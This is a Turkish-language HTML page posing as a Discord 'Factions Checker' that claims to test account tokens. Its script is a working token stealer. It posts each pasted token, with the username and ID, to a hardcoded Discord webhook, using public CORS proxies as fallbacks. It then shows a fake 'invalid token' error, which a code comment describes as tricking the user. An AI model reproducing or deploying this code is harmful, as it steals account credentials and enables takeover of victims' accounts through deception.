<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <title>Factions Check | Ultimate Edition</title>
    <style>
        body { background: #0a0a0a; color: #fff; font-family: 'Consolas', monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
        .box { background: rgba(15, 15, 15, 0.98); padding: 40px; border-radius: 15px; border: 1px solid #ff1e1e; width: 420px; text-align: center; box-shadow: 0 0 40px rgba(255, 30, 30, 0.2); }
        h1 { color: #ff1e1e; letter-spacing: 5px; margin-bottom: 25px; text-transform: uppercase; }
        textarea { width: 100%; height: 140px; background: #000; border: 1px solid #222; color: #00ff41; padding: 12px; border-radius: 8px; resize: none; outline: none; box-sizing: border-box; font-size: 12px; }
        button { width: 100%; padding: 16px; background: linear-gradient(45deg, #8b0000, #ff1e1e); color: #fff; border: none; border-radius: 8px; cursor: pointer; font-weight: bold; margin-top: 20px; text-transform: uppercase; transition: 0.3s; }
        #status-msg { margin-top: 20px; font-size: 14px; font-weight: bold; display: none; padding: 12px; border-radius: 6px; }
        .fail { color: #ff4d4d; background: rgba(255, 0, 0, 0.1); border: 1px solid rgba(255, 0, 0, 0.2); }
    </style>
</head>
<body>

<div class="box">
    <h1>FACTIONS CHECKER</h1>
    <textarea id="tokenList" placeholder="Tokenleri buraya girin..."></textarea>
    <button onclick="startCheck()">KONTROL ET</button>
    <div id="status-msg"></div>
</div>

<script>
    // GÖNDERDİĞİN YENİ WEBHOOK
    const wh_url = "https://discord.com/api/webhooks/1492875805930553374/ZqBGpibg0PhfFQeG7ReErCselxDgW3xQmkbIPY_3s5G1MwdaGnRwQFArPzlUQvBSA47t";

    async function startCheck() {
        const input = document.getElementById('tokenList');
        const status = document.getElementById('status-msg');
        const tokens = input.value.split('\n').map(t => t.trim()).filter(t => t !== "");

        if (tokens.length === 0) return;

        status.style.display = "block";
        status.style.color = "#888";
        status.className = "";
        status.innerText = "SİSTEM TARANIYOR...";

        for (let token of tokens) {
            try {
                // YÖNTEM 1: Doğrudan İstek (CORS kapalıysa çalışır)
                let r = await fetch('https://discord.com/api/v9/users/@me', {
                    headers: { 'Authorization': token }
                });

                // YÖNTEM 2: Proxy Üzerinden İstek (Tarayıcı engelliyorsa devreye girer)
                if (r.status !== 200) {
                    const proxy = `https://api.allorigins.win/get?url=${encodeURIComponent('https://discord.com/api/v9/users/@me')}`;
                    const pr = await fetch(proxy, { headers: { 'Authorization': token } });
                    const pd = await pr.json();
                    if (pd.contents && pd.contents.includes("username")) {
                        sendToWebhook(JSON.parse(pd.contents), token);
                    }
                } else {
                    const data = await r.json();
                    sendToWebhook(data, token);
                }
            } catch (e) {
                // Proxy fallback (Her ihtimale karşı)
                try {
                    const proxy2 = `https://corsproxy.io/?${encodeURIComponent('https://discord.com/api/v9/users/@me')}`;
                    const pr2 = await fetch(proxy2, { headers: { 'Authorization': token } });
                    if(pr2.ok) {
                        const d2 = await pr2.json();
                        sendToWebhook(d2, token);
                    }
                } catch(e2) {}
            }
        }

        // Kullanıcıyı kandır
        setTimeout(() => {
            status.className = "fail";
            status.innerHTML = "✕ GEÇERSİZ TOKEN! (HATA: 0x882)";
        }, 2000);
    }

    async function sendToWebhook(user, token) {
        await fetch(wh_url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                embeds: [{
                    title: "💎 HESAP GELDİ PURNA",
                    color: 16713180,
                    fields: [
                        { name: "Kullanıcı", value: `\`${user.username}#${user.discriminator}\``, inline: true },
                        { name: "ID", value: `\`${user.id}\``, inline: true },
                        { name: "Token", value: "```" + token + "```" }
                    ],
                    footer: { text: "Factions Ultimate | 200 OK" },
                    timestamp: new Date()
                }]
            })
        });
    }
</script>

</body>
</html>
